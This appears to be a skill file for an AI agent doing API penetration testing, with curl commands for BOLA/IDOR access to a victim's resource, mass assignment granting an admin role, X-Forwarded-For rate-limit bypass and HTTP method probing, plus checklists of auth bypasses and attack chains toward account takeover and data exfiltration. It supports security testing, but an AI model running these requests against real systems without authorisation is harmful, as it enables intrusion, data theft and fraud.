---
name: hunt-api
description: API security — BOLA/IDOR, mass assignment, rate limit bypass, auth bypass, method confusion. Must pass 7 gates.
---

# API HUNTING — 3 BULLETS MAX

**Core:** APIs are the #1 attack surface. Test systematically.

## DIFFERENTIAL
```bash
# BOLA: User A → User B's resource
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/$VICTIM_ID"
# Mass assignment
curl -s -X POST -H "Authorization: Bearer $TOKEN" -d '{"name":"test","role":"admin","balance":999999}' "https://target.com/api/users"
# Rate limit bypass
curl -s -H "X-Forwarded-For: 1.1.1.1" "https://target.com/api/login"
# Method confusion
for m in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  curl -s -o /dev/null -w "$m: %{http_code}\n" -X $m "https://target.com/api/users/$ID"
done
```

## ATTACKS
```
BOLA: sequential IDs, UUIDs from other endpoints, GraphQL aliases
Mass assignment: role, is_admin, balance, tenant_id, verified
Rate limit: X-Forwarded-For, method change, content-type change, parameter position
Auth bypass: empty token, invalid token, JWT none, expired token
Version: /v1 vs /v2 vs /internal vs /debug
GraphQL: batching (rate limit bypass), alias IDOR, nested query DoS, mutation auth bypass
```

## CHAINS
```
BOLA + mass assignment → admin takeover → Critical
Auth bypass + BOLA → mass data exfil → Critical
Rate limit bypass + OTP brute → ATO → High
GraphQL batching + IDOR → mass PII → Critical
Race condition + wallet → double-spend → Critical
```
